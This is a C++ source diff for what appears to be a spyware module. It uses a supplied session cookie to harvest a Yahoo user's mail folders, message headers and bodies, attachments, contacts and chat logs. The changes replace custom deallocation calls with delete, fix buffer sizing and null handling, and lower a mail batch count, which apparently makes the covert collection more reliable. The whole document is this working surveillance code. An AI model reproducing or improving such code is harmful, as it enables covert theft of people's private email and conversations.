@@ -420,7 +420,7 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 							if(bError)
 							{
 								YHFreeContactFields(&YHContact);
-								zndelete((LPVOID*)&jValue);
+								delete jValue;
 
 								return YAHOO_ALLOC_ERROR;
 							}
@@ -447,7 +447,7 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 	}
 
 	//free json value
-	zndelete((LPVOID*)&jValue);
+	delete jValue;
 
 	return YAHOO_SUCCESS;
 }
@@ -575,14 +575,14 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	dwRet = YHGetMailsList(strMailBoxName, strCookie, pYHParams, &jValue, &jMail, &dwNrOfMails);
 	if(dwRet != SOCIAL_REQUEST_SUCCESS)
 	{
-		zndelete((LPVOID*)&jValue);
+		delete jValue;
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
 
 	//no new mails to download
 	if(dwNrOfMails == 0)
 	{
-		zndelete((LPVOID*)&jValue);
+		delete jValue;
 		return SOCIAL_REQUEST_SUCCESS;
 	}
 
@@ -598,7 +598,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	pYHParams->strMailFolder = (LPWSTR)malloc(dwLen * sizeof(WCHAR));
 	if(pYHParams->strMailFolder == NULL)
 	{
-		zndelete((LPVOID*)&jValue);
+		delete jValue;
 		return YAHOO_ALLOC_ERROR;
 	}
 
@@ -628,7 +628,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 		if(strMailID == NULL)
 		{
 			znfree((LPVOID*)&pYHParams->strMailFolder);
-			zndelete((LPVOID*)&jValue);
+			delete jValue;
 			return YAHOO_ALLOC_ERROR;
 		}
 		_snprintf_s(strMailID, dwLen, _TRUNCATE, "%S", jObj[strMID]->AsString().c_str());
@@ -687,7 +687,7 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	} // end of for loop
 
 	//free json value
-	zndelete((LPVOID*)&jValue);
+	delete jValue;
 
 /*
 	//save the timestamp with the highest timestamp in the mail list.
@@ -715,7 +715,7 @@ DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	LPWSTR	strReqID		= NULL;
 	LPSTR	strPostBuffer   = NULL;
 	LPSTR	strRecvBuffer	= NULL;
-	DWORD	dwRet, dwBufferSize, dwLastMailID=0, dwMailDate=0, dwNrOfMails=500, dwMaxTimeStamp=0;
+	DWORD	dwRet, dwBufferSize, dwLastMailID=0, dwMailDate=0, dwNrOfMails=70, dwMaxTimeStamp=0;
 	BOOL	bList			= FALSE;
 
 	//json vars
@@ -817,7 +817,8 @@ DWORD YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	}
 	else
 	{		
-		zndelete((LPVOID*)jValue);
+		delete *jValue;
+		*jValue = NULL;
 	}
 
 	if (bList == FALSE)
@@ -890,7 +891,7 @@ DWORD YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 	if ((*jValue == NULL) || ((*jValue)->IsObject() == FALSE))
 	{
 		//if the json is not an obj or it's null, return an error
-		zndelete((LPVOID*)jValue);
+		delete *jValue;
 
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}	
@@ -1036,7 +1037,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 					if(strTmp == NULL)
 					{	
 						znfree((LPVOID*)&pOldBuf);
-						zndelete((LPVOID*)&jValue);
+						delete jValue;
 						return YAHOO_ALLOC_ERROR;
 					}						
 
@@ -1055,7 +1056,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 				if(*strMailHeader == NULL)
 				{
 					znfree((LPVOID*)&strTmp);
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_ALLOC_ERROR;
 				}
 				wcstombs_s((size_t*)&dwSize, *strMailHeader, dwTotSize+1, strTmp, _TRUNCATE);				
@@ -1071,7 +1072,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 		}
 	}
 
-	zndelete((LPVOID*)&jValue);
+	delete jValue;
 
 	return YAHOO_SUCCESS;
 }
@@ -1211,7 +1212,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 
 				if(!jMsg[0]->IsObject())
 				{
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_ERROR;
 				}
 
@@ -1228,7 +1229,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				//part array
 				if(!jObj[strPartFld]->IsArray())
 				{
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_ERROR;
 				}
 
@@ -1299,7 +1300,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					//add the section header to the mail
 					if(bWriteSection)
 					{
-						if(YHAddSectionHeader(&strTmp, &MailFields) != YAHOO_SUCCESS)
+						if((dwRet = YHAddSectionHeader(&strTmp, &MailFields)) != YAHOO_SUCCESS)
 						{
 							//free memory and exit
 							dwError = dwRet;
@@ -1308,7 +1309,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					}
 
 					//add the section text to the mail
-					if(YHAddSectionText(&strTmp, &MailFields) != YAHOO_SUCCESS)
+					if((dwRet = YHAddSectionText(&strTmp, &MailFields)) != YAHOO_SUCCESS)
 					{
 						//free memory and exit
 						dwError = dwRet;
@@ -1316,7 +1317,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 					}
 
 					//if present, download the attachment and add it to the mail
-					if(YHAddAttachment(&strTmp, lpYHParams, &MailFields, strMailID, strCookie) != YAHOO_SUCCESS)
+					if((dwRet = YHAddAttachment(&strTmp, lpYHParams, &MailFields, strMailID, strCookie)) != YAHOO_SUCCESS)
 					{
 						//free memory and exit
 						dwError = dwRet;
@@ -1380,7 +1381,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				if(dwError)
 				{
 					//free memory
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					znfree((LPVOID*)&strTmp);
 					YHFreeMailFields(&MailFields);
 					YHFreeMailFields(&MailNextFields);
@@ -1390,7 +1391,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 
 				if(strTmp == NULL)
 				{
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_SKIP;
 				}
 
@@ -1401,7 +1402,7 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 				if(*strMailBody == NULL)
 				{
 					znfree((LPVOID*)&strTmp);
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_ALLOC_ERROR;
 				}
 
@@ -1432,12 +1433,12 @@ DWORD YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR
 	else
 	{
 		//delete json value
-		zndelete((LPVOID*)&jValue);
+		delete jValue;
 		return YAHOO_ERROR;
 	}
 
 	//delete json value
-	zndelete((LPVOID*)&jValue);
+	delete jValue;
 
 	//if the mail is old, skip it
 	if(dwMailDate == 0)
@@ -1767,7 +1768,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 
 				if(!jMsg[0]->IsObject())
 				{
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_ERROR;
 				}
 
@@ -1780,7 +1781,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				//check if this mail has already been sent
 				if(lpYHParams->dwLowTS > dwMailDate)
 				{
-					zndelete(jValue);
+					delete jValue;
 					return YAHOO_SUCCESS;
 				}					
 */
@@ -1789,7 +1790,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				if(YHGetChatInfo(lpChatFields, jObj) != YAHOO_SUCCESS)
 				{
 					//free memory
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					znfree((LPVOID*)&strTmp);
 					YHFreeChatFields(lpChatFields);
 
@@ -1826,8 +1827,13 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 					if(_wcsicmp(lpChatFields->strType, L"text") || _wcsicmp(lpChatFields->strSubType, L"html"))
 					{
 						znfree((LPVOID*)&lpChatFields->strText);
+						znfree((LPVOID*)&lpChatFields->strSubType);
+						znfree((LPVOID*)&lpChatFields->strType);
 						continue;
 					}
+
+					znfree((LPVOID*)&lpChatFields->strSubType);
+					znfree((LPVOID*)&lpChatFields->strType);
 
 					//add the conversation to the buffer
 					if(YHAddChat(&strTmp, lpChatFields) != YAHOO_SUCCESS)
@@ -1846,7 +1852,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				if(dwError)
 				{
 					//free memory
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					znfree((LPVOID*)&strTmp);
 					YHFreeChatFields(lpChatFields);
 
@@ -1855,7 +1861,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 
 				if(strTmp == NULL)
 				{
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_SKIP;
 				}
 
@@ -1867,7 +1873,7 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 				{
 					YHFreeChatFields(lpChatFields);
 					znfree((LPVOID*)&strTmp);
-					zndelete((LPVOID*)&jValue);
+					delete jValue;
 					return YAHOO_ALLOC_ERROR;
 				}
 
@@ -1885,12 +1891,12 @@ DWORD YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strChatID, LPYAHOO_CONNE
 	else
 	{
 		//delete json value
-		zndelete((LPVOID*)&jValue);
+		delete jValue;
 		return YAHOO_ERROR;
 	}
 
 	//delete json value
-	zndelete((LPVOID*)&jValue);
+	delete jValue;
 
 	//if the mail is old, skip it
 	if(dwMailDate == 0)
@@ -2164,17 +2170,34 @@ DWORD YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, 
 //assemble email according to eml format
 DWORD YHAssembleMail(LPSTR strMailHeader, LPSTR strMailBody, LPSTR *strMail)
 {
-	DWORD dwSize;
+	DWORD dwSize = 0;
+
+	if(strMailHeader == NULL)
+		return YAHOO_ERROR;
+	
+	dwSize += strlen(strMailHeader);
+
+	if(strMailBody != NULL)
+		dwSize += strlen(strMailBody);
+
+	if(dwSize == 0)
+		return YAHOO_ERROR;
+
+	//add CRLF between the header and the body
+	dwSize += 4;
 
 	//total size of the mail
-	dwSize = strlen(strMailHeader) + strlen(strMailBody) + 2 + 2; //add CRLF between the header and the body
+//	dwSize = strlen(strMailHeader) + strlen(strMailBody) + 2 + 2; //add CRLF between the header and the body
 
 	*strMail = (LPSTR)zalloc(dwSize);
 	if(*strMail == NULL)
 		return YAHOO_ALLOC_ERROR;
 	SecureZeroMemory(*strMail, dwSize);
-
-	sprintf_s(*strMail, dwSize, "%s\r\n%s", strMailHeader, strMailBody);
+	
+	if(strMailBody != NULL)
+		sprintf_s(*strMail, dwSize, "%s\r\n%s", strMailHeader, strMailBody);
+	else
+		sprintf_s(*strMail, dwSize, "%s", strMailHeader);
 
 	return YAHOO_SUCCESS;
 }
@@ -2458,8 +2481,10 @@ DWORD YHAddMailBoundary(LPWSTR *strMail, LPYAHOO_MAIL_BOUNDARIES lpMailBoundarie
 
 		//remove the closed boundary from memory
 		YHDelBoundary(lpMailBoundaries->lpBoundaries, dwCurrBoundary);
-		lpMailBoundaries->dwCurrentItem	-= 1;
-		lpMailBoundaries->dwTotItems	-= 1;
+		if(lpMailBoundaries->dwCurrentItem	> 0)
+			lpMailBoundaries->dwCurrentItem	-= 1;
+		if(lpMailBoundaries->dwTotItems	> 0)
+			lpMailBoundaries->dwTotItems	-= 1;
 	}
 	else
 	{
@@ -2901,6 +2926,8 @@ DWORD YHFreeBoundaries(LPYAHOO_MAIL_BOUNDARIES lpMailBoundaries)
 		znfree((LPVOID*)&lpMailBoundaries->lpBoundaries[i]);
 	}
 
+	znfree((LPVOID*)&lpMailBoundaries->lpBoundaries);
+
 	return YAHOO_SUCCESS;
 }
 
@@ -3017,7 +3044,7 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 	}
 	else
 	{	//if the json is not an obj or it's null, return an error
-		zndelete((LPVOID*)&jValue);
+		delete jValue;
 
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
@@ -3047,7 +3074,7 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 		if(strFolderName == NULL)
 		{
 			YHFreeConnectionParams(&YHParams);
-			zndelete((LPVOID*)&jValue);
+			delete jValue;
 
 			return SOCIAL_REQUEST_BAD_COOKIE;
 		}
@@ -3073,7 +3100,7 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 	}
 
 	//delete json parsed value
-	zndelete((LPVOID*)&jValue);
+	delete jValue;
 
 	//free connection params
 	YHFreeConnectionParams(&YHParams);
@@ -3332,13 +3359,13 @@ DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
 		//dwWR += wcslen(strUTF);
 		dwLen = wcslen(strUTF);
 
-		if ((dwWR + dwLen) >= dwNewSize)
+		if ((dwWR + dwLen + 6) >= dwNewSize)
 		{	
 			pOldBuf = *lpUTFBuf;
 			*lpUTFBuf = (LPWSTR)realloc(*lpUTFBuf, (dwNewSize+YAHOO_ALLOC_SIZE) * sizeof(WCHAR));
 			if(*lpUTFBuf == NULL)
 			{
-				znfree((LPVOID*)pOldBuf);
+				znfree((LPVOID*)&pOldBuf);
 				return YAHOO_ALLOC_ERROR;
 			}
 			*((*lpUTFBuf)+dwWR+dwLen) = 0;
